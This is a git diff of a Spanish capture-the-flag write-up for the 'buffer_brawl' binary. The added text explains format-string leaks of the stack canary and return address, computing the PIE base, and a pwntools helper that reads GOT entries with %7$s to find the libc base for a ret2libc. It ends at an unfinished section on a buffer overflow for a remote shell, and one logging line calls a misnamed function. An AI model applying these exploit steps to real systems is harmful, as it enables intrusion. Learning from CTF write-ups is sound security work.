@@ -52,6 +52,8 @@ Right or left?
 0x7ffca7cad6f0
 ```
 
+El parámetro %p en una cadena de formato se utiliza para imprimir una dirección de memoria en formato hexadecimal, con varias podemos imprimir las direcciones de memoria en la pila.
+
 Con este script filtramos las primeras 12 direcciones de memoria del stack y formateamos un poco la salida:
 
 ``` python
@@ -103,17 +105,19 @@ python3 leakstack.py
 [*] Stopped process './buffer_brawl' (pid 6996)
 ```
 
-Escribimos el stack en 6, 11 es el canario y 13 es la direccion de retorno al menú. Podemos comprobar esto en radare2 u otro debbugger
+Escribimos el stack en 6, 11 es el canario y 13 es la direccion de retorno al menú. Podemos comprobar esto en radare2 u otro debbugger:
 
 ![f1](https://github.com/user-attachments/assets/21c62cc0-ed0b-4073-8b97-935f0c10b5c0)
 
 ![return](https://github.com/user-attachments/assets/ef5625c9-3247-4e99-95db-0c8c4d64da63)
 
-La primera imagen es el estado de la pila justo después de introducir la cadena, y la segunda es justo antes de ret. Como podemos observar efectivamente la décimo-tercera dirección filtrada es el retorno
+La primera imagen es el estado de la pila justo después de introducir la cadena, y la segunda es justo antes de ret. Como podemos observar efectivamente la décimo-tercera dirección filtrada es el retorno.
 
-Para calcular la direccion base del ejecutable solo hay que restarle el desplazamiento de esa direccion a la direccion filtrada. Encontramos el desplazamiento en un análisis estático al elf
+Para calcular la direccion base del ejecutable solo hay que restarle el desplazamiento de esa direccion a la direccion filtrada. Encontramos el desplazamiento en un análisis estático al elf.
 
 ![slipreturn](https://github.com/user-attachments/assets/385fe987-62a0-4462-8ffd-8362b0318bfa)
+
+%<n>$p es un identificador de formato que nos permite imprimir un valor específico de la pila, donde n es el desplazamiento a a dirección actual del puntero de pila, contado a partir de 1.
 
 Entonces, podemos obtener las direcciones que nos interesan con %11$p y %13$p y calcular la direccion base del ejecutable, por ahora el script iría quedando así:
 
@@ -134,9 +138,33 @@ exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
 exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base
 ``` 
 
-El relleno se usa para alinear correctamente la memoria y asegurarse de que la dirección de la GOT esté en la posición adecuada.
+Aquí ahora necesitamos hacer un ret2libc, para eso necesitamos la dirección base de libc, pero primero tenemos que filtrar alguna dirección de las funciones de libc usadas en el ejecutable (printf, puts, etc...)
 
-`incompleto`
+Nos auxiliaremos del parámetro %s, que muestra la memoria de una dirección dada en el stack (los símbolos de la Global Offset Table en tiempo de ejecución contienen la dirección real de la función en libc). El relleno con ljust se usa para alinear correctamente la memoria y asegurarse de que la dirección de la GOT esté en la posición adecuada:
+
+``` python
+# 2.Obtener la direccion base de libc
+def leak_got(sym):
+    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
+    addr = u64(addr[:6] + b"\x00\x00")
+    return addr
+
+puts_addr = leak_got("puts")
+io.info(f"{leak("puts")=:x}")
+
+""""
+# Usado para encontrar la version de libc correcta en el remoto
+io.info(f"{leak_got("printf")=:x}")
+io.info(f"{leak_got("read")=:x}")
+io.info(f"{leak_got("exit")=:x}")
+""" 
+
+libc.address = puts_addr - libc.sym.puts
+```
+### Seccion incompleta
+
+Bien, ahora necesitamos un buffer overflow para ganar una shell remota. Si dejamos la vida del stack en el juego a 13 exactamente nos lleva a una función stack_smash que acepta una entrada:
+
 ``` C
 void stack_smash(void)
 
